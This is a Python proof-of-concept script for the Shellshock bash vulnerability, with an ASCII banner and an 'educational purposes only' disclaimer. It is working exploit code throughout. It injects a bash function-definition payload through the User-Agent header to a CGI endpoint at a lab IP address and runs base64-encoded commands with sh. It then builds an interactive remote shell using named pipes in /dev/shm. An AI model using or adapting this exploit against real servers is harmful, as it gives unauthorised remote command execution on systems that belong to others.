## Edit the script to replace the Url with your own url

#from IPython.core.debugger import Tracer; breakpoint = Tracer()
import requests
import time
from base64 import b64encode
from random import randrange
import threading



try:
 from colorama import Fore,Back;
except ImportError:
 print ("\n[1] Colorama package not installed. [ DO it First ]");
 print ("\n[2] WINNT not supported");
 sys.exit(1);


def _banner_(): 
 shocker = """ 
                 _                _             
           ___| |__   ___   ___| | _____ _ __ 
          / __| '_ \ / _ \ / __| |/ / _ \ '__|
          \__ \ | | | (_) | (__|   <  __/ |   
          |___/_| |_|\___/ \___|_|\_\___|_|   
          """
              
 print (Fore.MAGENTA+ shocker +Fore.RESET)   
 print (Fore.GREEN+"\n\t-> Author : Nelson [ 13lackZ3r0 ]");
 print ("\t-> This script is written as POC for shellshock vulnerabality");
 print(Fore.RED+"\t-> I Respect SEcurity { ScRipt F0r Educational Purposes Only }\n"+Fore.RESET);
 print(Fore.MAGENTA+"=============================================================================" +Fore.RESET)
 
 
_banner_();


class AllTheReads(object):
    def __init__(self, interval=1): # thread initializes
        self.interval = interval
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = True # puts it in the background
        thread.start()

    def run(self):
        readoutput = """ /bin/cat %s """ %(stdout)
        clearoutput = """ echo '' > %s """ %(stdout)
        while True:
            output = RunCmd(readoutput)
            if output:
                RunCmd(clearoutput)
                print(output)
            time.sleep(self.interval)

def RunCmd(cmd):
    cmd = cmd.encode('utf-8')
    cmd = b64encode(cmd).decode('utf-8')
    headers = {
    'User-Agent': '() { ,;}; echo "Content-Type:text/plain"; echo; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; echo %s |base64 -d |sh' % (cmd) 
    }
    result = requests.get('http://192.168.56.116:591/cgi-bin/cat', headers=headers, timeout=5).text.strip()
    return result

def WriteCmd(cmd):
    cmd = cmd.encode('utf-8')
    cmd = b64encode(cmd).decode('utf-8')
    headers = {
    'User-Agent': '() { ,;}; echo "Content-Type:text/plain"; echo; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; echo %s |base64 -d > %s' % (cmd, stdin) 
    }
    result = requests.get('http://192.168.56.116:591/cgi-bin/cat', headers=headers, timeout=5).text.strip()
    return result

def ReadCmd():
    GetOutput = """ /bin/cat %s """ %(stdout)
    output = RunCmd(GetOutput)
    return output

def SetupShell():
    NamedPipes = """ mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s """ %(stdin, stdin, stdout) 
    try:
        RunCmd(NamedPipes)
    except:
        None    
    return None

global stdin, stdout
session = randrange(1000, 9999)
stdin = '/dev/shm/input.%s' %(session)
stdout = '/dev/shm/output.%s' %(session)

SetupShell()

# Infinite Loop to read STDOUT File
ReadingTheThings = AllTheReads()

while True:
    cmd = input('> ')
    WriteCmd(cmd + '\n')
    time.sleep(1.1)
    
